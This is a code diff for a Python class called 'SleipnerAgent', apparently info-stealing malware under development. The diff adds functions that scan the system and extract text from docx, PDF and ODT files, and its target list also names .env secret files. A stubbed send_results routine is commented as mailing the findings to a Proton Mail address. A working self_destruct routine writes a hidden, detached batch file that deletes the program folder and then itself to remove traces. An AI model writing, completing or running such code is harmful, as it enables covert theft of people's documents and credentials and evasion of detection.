@@ -1,4 +1,4 @@
-import sys, os, random, re
+import sys, os, random, locale, tempfile, subprocess, textwrap
 
 TARGET_FILETYPES = [
     "docx", 
@@ -41,9 +41,13 @@ class SleipnerAgent:
             # if system_language != "Undefined": 
             #     self.give_agent_language_knowledge(system_language)
 
-            self._scan_files("Downloads", "docx")
-            self._analyze_files()
-            ...
+            self.determine_system_language_v2()
+
+            self._scan_files()
+            print(f"{len(self.potential_targets)} files found.")
+            # self._analyze_files()
+            
+            self.self_destruct()
 
         else:
             self.send_results()
@@ -85,7 +89,7 @@ class SleipnerAgent:
             from langdetect import detect, DetectorFactory
             DetectorFactory.seed = 42
             
-            print("Langdetect successfully imported")
+            print("Successfully imported langdetect.")
         except ImportError:
             print("langdetect not found in ./libs")
             return False
@@ -109,22 +113,58 @@ class SleipnerAgent:
             # Try importing with specific path handling
             import docx
             self.docx = docx
-            print(f"Successfully imported python-docx from {docx.__file__}")
-            return True
+            print(f"Successfully imported python-docx.")
             
         except ImportError as e:
             print(f"Failed to import python-docx: {e}")
             
-            # Try direct import from libs directory as fallback
-            try:
-                sys.path.insert(0, os.path.abspath("./libs"))
-                import docx
-                self.docx = docx
-                print(f"Successfully imported python-docx from libs directory")
-                return True
-            except ImportError:
-                print("python-docx not found in any module path.")
+   
+        ##########################
+        ##  INSTALL PDF READER  ##
+        ##########################
+        try:
+            # First make sure packages and PyPDF2 exist
+            packages_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'libs', 'packages')
+            pypdf2_path = os.path.join(packages_path, 'PyPDF2')
+            
+            if not os.path.exists(pypdf2_path):
+                print(f"PyPDF2 module not found at expected path: {pypdf2_path}")
                 return False
+                
+            # Make sure packages dir is in path
+            if packages_path not in sys.path:
+                sys.path.insert(0, packages_path)
+                
+            # Try importing with specific path handling
+            import PyPDF2
+            self.pypdf2 = PyPDF2
+            print(f"Successfully imported PyPDF2.")
+                        
+        except ImportError as e:
+            print(f"Failed to import PyPDF2: {e}")
+            
+            
+        ##########################
+        ##  INSTALL ODF READER  ##
+        ##########################
+        try:
+            odf_path = os.path.join(packages_path, 'odf')
+            
+            if not os.path.exists(odf_path):
+                print(f"odf module not found at expected path: {odf_path}")
+                return False
+
+            if packages_path not in sys.path:
+                sys.path.insert(0, packages_path)
+
+            import odf
+            self.odf = odf
+            print(f"Successfully imported odf.")
+
+        except ImportError as e:
+            print(f"Failed to import odf: {e}")
+            
+        return True
         
     def give_agent_language_knowledge(self, language_code: str) -> bool:
         """
@@ -251,21 +291,23 @@ class SleipnerAgent:
 
         return top_language["Language"]
     
-    def read_docx_file(self, file_path):
+    def determine_system_language_v2(self) -> str:
+        
+        lang_code, _ = locale.getdefaultlocale()
+        print(f"System language: {lang_code}")
+
+        return lang_code
+
+    def _read_docx(self, file_path):
 
         packages_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'libs', 'packages')
         sys.path.insert(0, packages_path)
-
-        """Read and display content from a Word document"""
-        if not os.path.exists(file_path):
-            print(f"Error: File '{file_path}' not found.")
-            return
             
         try:
             # Open the document
             doc = self.docx.Document(file_path)
             
-            print(f"\n--- Content of {os.path.basename(file_path)} ---\n")
+            print("--- NEW DOCX DOCUMENT ---")
             
             # Print all paragraphs
             for para in doc.paragraphs:
@@ -281,19 +323,61 @@ class SleipnerAgent:
                         row_text = [cell.text for cell in row.cells]
                         print(" | ".join(row_text))
                     print("")
-                    
-            print("\n--- End of document ---\n")
-            
+                                
         except Exception as e:
             print(f"Error reading document: {str(e)}")
 
-    def _read_pdf(self, filename) -> str:
-        # Clean and read pdf files
-        ...
+    def _read_pdf(self, file_path) -> str:
+        packages_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'libs', 'packages')
+        sys.path.insert(0, packages_path)
 
-    def _read_odt(self, filename) -> str:
-        # Clean and read odt files
-        ...
+        try:
+            with open(file_path, 'rb') as f:
+                reader = self.pypdf2.PdfReader(f)
+
+                print("--- NEW PDF DOCUMENT ---")
+
+                text = ""
+                for i, page in enumerate(reader.pages):
+                    page_text = page.extract_text()
+                    if page_text:
+                        print(f"Page {i+1}:\n{page_text.strip()}\n")
+                        text += page_text + "\n"
+
+                return text.strip()
+
+        except Exception as e:
+            print(f"Error reading PDF: {str(e)}")
+            return ""
+
+
+    def _read_odt(self, file_path) -> str:
+        packages_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'libs', 'packages')
+        sys.path.insert(0, packages_path)
+
+        try:
+            from odf.opendocument import load
+            from odf.text import P
+
+            doc = load(file_path)
+            paragraphs = doc.getElementsByType(P)
+
+            print("--- NEW ODT DOCUMENT ---")
+
+            text = ""
+            for para in paragraphs:
+                if para.firstChild:
+                    paragraph_text = para.firstChild.data.strip()
+                    if paragraph_text:
+                        print(paragraph_text)
+                        text += paragraph_text + "\n"
+
+            return text.strip()
+
+        except Exception as e:
+            print(f"Error reading ODT file: {str(e)}")
+            return ""
+
 
     def _scan_files(self, directory=None, filetypes=None):
         # Get all text files in the system
@@ -309,28 +393,52 @@ class SleipnerAgent:
             
             match filetype:
                 case "docx":
-                    self.read_docx_file(filepath)
+                    self._read_docx(filepath)
                 case "pdf":
-                    ...
+                    self._read_pdf(filepath)
                 case "odt":
-                    ...
+                    self._read_odt(filepath)
                 case "env":
                     ...
                 case "txt":
                     ...
 
-        
-
-
     def send_results(self):
         # Send found results to no-reply-businesssuite@proton.me
         ...
 
-    def clean_tracks(self):
-        # Delete self to hide tracks
-        ...
+    def self_destruct():
+        #  Find program path
+        program_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
 
-    
+        # Batch file in %TEMP%
+        bat_path = os.path.join(tempfile.gettempdir(), "self_delete.bat")
+
+        batch = textwrap.dedent(f"""\
+            @echo off
+            timeout /t 3 >nul
+
+            cd /d %temp%
+
+            for /l %%i in (1,1,30) do (
+                if not exist "{program_dir}" goto done
+                rmdir /s /q "{program_dir}" 2>nul
+                if exist "{program_dir}" timeout /t 1 >nul
+            )
+            :done
+            del "%~f0" 2>nul
+        """)
+
+        with open(bat_path, "w", encoding="utf-8") as bat:
+            bat.write(batch)
+
+        # Start the batch file hidden & detached so it outlives the program
+        creationflags = subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS
+        subprocess.Popen(["cmd", "/c", bat_path], creationflags=creationflags)
+
+        # Leave the folder so it isn’t held open, then quit
+        os.chdir(tempfile.gettempdir())
+        sys.exit(0)
 
 
 class Lantern:
